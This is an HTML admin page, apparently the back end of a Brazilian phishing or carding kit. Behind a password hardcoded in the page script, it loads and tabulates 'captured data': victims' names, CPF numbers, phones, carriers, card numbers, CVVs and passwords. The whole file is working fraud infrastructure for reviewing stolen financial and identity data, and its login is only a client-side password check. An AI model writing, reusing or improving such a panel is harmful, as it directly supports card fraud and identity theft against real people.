<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Admin - Elite Ink</title>
    <style>
        body { background-color: #0d1117; color: white; font-family: sans-serif; padding: 20px; }
        .container { background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 13px; }
        th, td { border: 1px solid #30363d; padding: 10px; text-align: left; }
        th { background: #238636; }
        .hidden { display: none; }
        #login { text-align: center; margin-top: 100px; }
        input { padding: 10px; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white; }
    </style>
</head>
<body>
    <div id="login">
        <h2>Acesso Restrito</h2>
        <input type="password" id="pass" placeholder="Senha Admin">
        <button onclick="logar()" style="padding: 10px; cursor: pointer;">Entrar</button>
    </div>

    <div id="conteudo" class="hidden container">
        <h2>📊 Dados Capturados</h2>
        <button onclick="carregar()" style="background: #58a6ff; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">🔄 Atualizar</button>
        <table>
            <thead>
                <tr>
                    <th>Operadora</th><th>Nome</th><th>CPF</th><th>Telefone</th><th>Valor</th><th>Cartão</th><th>CVV</th><th>Senha</th><th>Data</th>
                </tr>
            </thead>
            <tbody id="tabelaCorpo"></tbody>
        </table>
    </div>

    <script>
        function logar() {
            // Senha definida por você: dks10dks
            if(document.getElementById('pass').value === "dks10dks") {
                document.getElementById('login').classList.add('hidden');
                document.getElementById('conteudo').classList.remove('hidden');
                carregar();
            } else { alert("Senha incorreta!"); }
        }

        async function carregar() {
            try {
                const res = await fetch('/ver-dados-restritos');
                const dados = await res.json();
                const corpo = document.getElementById('tabelaCorpo');
                corpo.innerHTML = dados.map(i => `
                    <tr>
                        <td>${i.operadora || '-'}</td>
                        <td>${i.nome || '-'}</td>
                        <td>${i.cpf || '-'}</td>
                        <td>${i.telefone || '-'}</td>
                        <td>${i.valor || '-'}</td>
                        <td>${i.cartao || '-'}</td>
                        <td>${i.cvv || '-'}</td>
                        <td style="color: #ff7b72; font-weight: bold;">${i.senha || '-'}</td>
                        <td>${new Date(i.dataRegistro).toLocaleString('pt-BR')}</td>
                    </tr>
                `).join('');
            } catch (err) { console.error("Erro ao carregar dados."); }
        }
    </script>
</body>
</html>
